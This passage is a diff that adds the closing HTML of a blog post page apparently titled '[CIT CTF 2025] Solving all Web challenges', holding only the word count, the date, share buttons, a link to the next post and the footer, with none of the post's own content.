+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        843 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2025-04-28 03:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges&amp;caption=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges&amp;canonicalUrl=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges&amp;body=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f&amp;media=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f;description=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f&amp;title=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges&amp;summary=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges&amp;source=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f&amp;resubmit=true&amp;title=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f;title=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges%20https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f&amp;t=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=%5bCIT%20CTF%202025%5d%20Solving%20all%20Web%20challenges&amp;url=https%3a%2f%2fwww.mindpatch.net%2fposts%2f2025-04-28-cit-ctf%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://www.mindpatch.net/posts/2024-01-10-analysis-of-cve-202230781/">
+                    <span class="button__text">Analysis of CVE-2022–30781</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>
+
+
+
+
+    </body>
+</html>
